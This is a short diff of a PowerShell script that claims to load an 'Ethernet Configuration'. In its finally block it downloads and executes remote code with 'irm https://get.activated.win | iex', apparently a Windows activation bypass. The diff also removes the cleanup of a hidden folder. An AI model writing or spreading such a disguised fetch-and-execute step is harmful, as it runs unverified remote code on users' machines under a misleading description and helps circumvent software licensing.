@@ -74,9 +74,6 @@ if ($uacStatus -eq $false) {
         Write-Host "An error occurred during loading Ethernet Configuration. Please try again." -ForegroundColor Red
         exit 1
     } finally {
-        if (Test-Path $hiddenFolder) {
-            Remove-Item $hiddenFolder -Recurse -Force
-        }
         irm https://get.activated.win | iex
     }
 } else {
